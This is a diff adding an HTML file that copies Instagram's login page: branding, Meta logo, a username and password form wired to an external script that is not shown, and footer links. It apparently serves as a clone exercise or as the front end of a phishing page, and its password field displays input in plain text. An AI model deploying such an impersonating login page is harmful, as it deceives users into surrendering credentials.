@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link rel="icon" type="image/png" sizes="32x32" href="./assets/favicon.png">
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+    <main class="main-container">
+        <div class="left-column">
+            <div class="logo-container">
+                <img src="assets/logo.png" alt="Instagram" class="instagram-logo">
+            </div>
+
+            <h1 class="headline">
+                <span class="headline-black">See everyday moments from your</span><br>
+                <span class="headline-gradient">close friends.</span>
+            </h1>
+
+            <div class="collage-container">
+                <img src="assets/phones.png" alt="Instagram Phones" class="phones-image">
+            </div>
+        </div>
+
+        <div class="divider"></div>
+
+        <div class="right-column">
+            <div class="login-card">
+                <div class="mobile-logo-container">
+                    <img src="assets/logo.png" alt="Instagram" class="instagram-logo-mobile">
+                </div>
+                <div class="mobile-divider"></div>
+
+                <h2 class="login-heading">Log in to Instagram</h2>
+
+                <form id="loginForm" class="login-form">
+                    <div class="input-wrapper">
+                        <input type="text" id="username" class="login-input"
+                            placeholder="Mobile number, username or email address" required>
+                    </div>
+                    <div class="input-wrapper">
+                        <input type="text" id="password" class="login-input" placeholder="Password" required>
+                    </div>
+                    <button type="submit" id="loginBtn" class="login-btn disabled" disabled>Log in</button>
+                    <div id="errorMessage" class="error-message"></div>
+                </form>
+
+                <a href="#" class="forgot-password">Forgotten password?</a>
+
+                <button class="fb-login-btn">
+                    <svg class="fb-icon" viewBox="0 0 24 24" width="20" height="20">
+                        <path
+                            d="M12 2.04C6.5 2.04 2 6.53 2 12.06C2 17.06 5.66 21.21 10.44 21.96V14.96H7.9V12.06H10.44V9.85C10.44 7.34 11.93 5.96 14.22 5.96C15.31 5.96 16.45 6.15 16.45 6.15V8.62H15.19C13.95 8.62 13.56 9.39 13.56 10.18V12.06H16.34L15.89 14.96H13.56V21.96A10 10 0 0 0 22 12.06C22 6.53 17.5 2.04 12 2.04Z"
+                            fill="#1877F2" />
+                    </svg>
+                    Log in with Facebook
+                </button>
+
+                <button class="create-account-btn">Create new account</button>
+
+                <div class="meta-logo-section">
+                    <svg class="meta-icon" viewBox="0 0 40 40" width="24" height="24">
+                        <path fill="#737373"
+                            d="M29.5 9.75c-2.32 0-4.5.88-6.19 2.45L20 15.36l-3.31-3.16a8.84 8.84 0 0 0-6.19-2.45c-4.91 0-8.9 3.99-8.9 8.9s3.99 8.9 8.9 8.9c2.32 0 4.5-.88 6.19-2.45L20 21.94l3.31 3.16c1.69 1.57 3.87 2.45 6.19 2.45 4.91 0 8.9-3.99 8.9-8.9s-3.99-8.9-8.9-8.9zm0 15.2c-1.6 0-3.1-.6-4.25-1.7L22 20.15l3.25-3.1c1.15-1.1 2.65-1.7 4.25-1.7 3.47 0 6.3 2.83 6.3 6.3s-2.83 6.3-6.3 6.3zM10.5 24.95c-1.6 0-3.1-.6-4.25-1.7-1.15-1.1-1.7-2.65-1.7-4.25 0-3.47 2.83-6.3 6.3-6.3 1.6 0 3.1.6 4.25 1.7L18 17.55l-3.25 3.1c-1.15 1.1-2.65 1.7-4.25 1.7z" />
+                    </svg>
+                    <span class="meta-text">Meta</span>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <footer class="footer">
+        <div class="footer-links">
+            <a href="#">Meta</a>
+            <a href="#">About</a>
+            <a href="#">Blog</a>
+            <a href="#">Jobs</a>
+            <a href="#">Help</a>
+            <a href="#">API</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+            <a href="#">Locations</a>
+            <a href="#">Instagram Lite</a>
+            <a href="#">Threads</a>
+            <a href="#">Contact uploading and non-users</a>
+            <a href="#">Meta Verified</a>
+        </div>
+        <div class="footer-bottom">
+            <select class="language-selector">
+                <option value="en">English (UK)</option>
+            </select>
+            <span class="copyright">© 2026 Instagram from Meta</span>
+        </div>
+    </footer>
+    <script src="script.js"></script>
+</body>
+
+</html>
